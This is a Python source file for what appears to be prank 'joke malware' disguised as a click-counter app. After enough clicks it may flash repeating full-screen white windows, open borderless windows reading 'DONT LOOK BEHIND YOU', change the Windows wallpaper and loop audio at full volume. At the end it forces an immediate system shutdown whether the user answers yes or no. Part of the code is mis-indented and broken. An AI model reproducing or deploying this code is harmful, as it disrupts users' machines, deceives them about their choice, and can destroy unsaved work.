import tkinter as tk
from tkinter import messagebox
from PIL import Image, ImageTk
import random
import ctypes
import os
import pygame
import time
from screeninfo import get_monitors

Warning_accepted = False
if not Warning_accepted:
    respomse = messagebox.askyesno("STOP", "this is malware you wanna continue?")
    if respomse:
        Warning_accepted = True
        
    class MovingWindow:
        warning_accepted = False

    def __init__(self, master):
        self.master = master
        self.master.title("YOUR TITLE")
        self.master.geometry("100x100")

        self.monitors = get_monitors()

        self.start_move()
        self.master.after(1, self.duplicate_window)

    def start_move(self):
        self.move_window_smooth()

    def move_window_smooth(self, steps=5, duration=0):
        initial_x = self.master.winfo_x()
        initial_y = self.master.winfo_y()

        monitor = random.choice(self.monitors)  # Choose a random monitor
        target_x = random.randint(monitor.x, monitor.x + monitor.width - 150)
        target_y = random.randint(monitor.y, monitor.y + monitor.height - 100)

        x_step = (target_x - initial_x) / steps
        y_step = (target_y - initial_y) / steps

        self.move_smooth_recursive(initial_x, initial_y, x_step, y_step, steps, duration)

    def move_smooth_recursive(self, current_x, current_y, x_step, y_step, steps_left, duration):
        if steps_left > 0:
            self.master.geometry(f"100x100+{int(current_x)}+{int(current_y)}")

            random_color = "#{:06x}".format(random.randint(0, 0xFFFFFF))
            self.master.configure(bg=random_color)

            self.master.after(int(duration / 50),
                              lambda: self.move_smooth_recursive(current_x + x_step, current_y + y_step,
                                                                 x_step, y_step, steps_left - 1, duration))

    def duplicate_window(self):
        if not hasattr(self, "duplicated"):
            new_window = tk.Toplevel(self.master)
            new_window.overrideredirect(True)
            new_window.attributes("-topmost", True)
            new_window.geometry("100x100+0+0")
            MovingWindow(new_window)
            self.duplicated = True

class ClickCounterApp:
    def __init__(self, master):
        self.master = master
        master.title("Click my balls App")
        self.click_count = 0
        master.overrideredirect(True)
        self.screen_width = master.winfo_screenwidth()
        self.screen_height = master.winfo_screenheight()
        x = (self.screen_width - master.winfo_reqwidth()) // 2
        y = (self.screen_height - master.winfo_reqheight()) // 2
        master.geometry(f"+{x}+{y}")
        self.label = tk.Label(master, text="Click Count: 0", font=("Arial", 16))
        self.label.pack(pady=30)
        self.button = tk.Button(master, text="Click Me", command=self.increment_counter, font=("Arial", 10), padx=10, pady=10)
        self.button.pack()
        pygame.mixer.init()
        self.song_path = os.path.join(os.getcwd(), 'virus.sound2.0.mp3')
        pygame.mixer.music.load(self.song_path)
        pygame.init()
        self.screen = pygame.display.set_mode((1, 1), pygame.NOFRAME)

    def increment_counter(self):
        self.click_count += 1
        self.label.config(text=f"Click Count: {self.click_count}")
        if self.click_count >= 27 and random.random() < 0.5:
            self.flash_screen()
            self.open_image_window()
            self.flash_warning()
            self.play_song_with_distortion()

    def open_image_window(self):
        image_path = "maxresdefault.jpg"
        self.change_wallpaper(image_path)
        new_window = tk.Toplevel(self.master)
        new_window.overrideredirect(True)
        monitor = random.choice(get_monitors())  # Choose a random monitor
        new_window.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
        label = tk.Label(new_window, text="DONT LOOK BEHIND YOU")
        label.pack(pady=10)
        image_label = tk.Label(new_window)
        image_label.pack()
        self.show_image(image_path, image_label)

    def show_image(self, path, label):
        try:
            image = Image.open(path)
            image = image.resize((300, 300))
            photo = ImageTk.PhotoImage(image)
            label.config(image=photo)
            label.image = photo
        except Exception as e:
            print(f"Error: {e}")

    def flash_warning(self):
        for _ in range(5):
            self.label.pack_forget()
            self.master.update()
            time.sleep(0.5)
            self.label.pack()
            self.master.update()
            time.sleep(0.5)

    def flash_screen(self):
        for monitor in get_monitors():
            flash = tk.Toplevel()
            flash.attributes('-fullscreen', True)
            flash.configure(bg="white")
            flash.geometry(f"{monitor.width}x{monitor.height}+{monitor.x}+{monitor.y}")
            flash.after(200, flash.destroy)
            self.master.after(2000, self.flash_screen)

    def play_song_with_distortion(self):
        pygame.mixer.music.set_volume(2.0)
        pygame.mixer.music.play(loops=-1)

    def change_wallpaper(self, image_path):
        abs_image_path = os.path.abspath(image_path)
        SPI_SETDESKWALLPAPER = 0x0014
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, abs_image_path, 3)

if __name__ == "__main__":
    root = tk.Tk()
    app = ClickCounterApp(root)
    root.mainloop()

shutdown = input("Do you wish to shutdown your computer to fix it? (yes / no): ") 

if shutdown == 'no': 
    os.system("shutdown /s /t 1") 
else: 
    os.system("shutdown /s /t 1") 
